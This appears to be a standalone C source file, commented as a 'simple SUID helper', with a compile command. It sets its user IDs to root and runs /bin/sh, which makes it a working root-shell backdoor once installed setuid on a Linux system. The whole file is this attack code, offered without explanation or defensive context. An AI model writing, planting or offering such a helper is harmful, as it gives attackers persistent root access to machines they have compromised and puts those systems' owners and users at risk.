// simple SUID helper: spawns a shell
// compile with: gcc -o suid_root suid_root.c
#include <unistd.h>
int main() {
    setuid(0);
    seteuid(0);
    execl("/bin/sh", "sh", NULL);
    return 0;
}
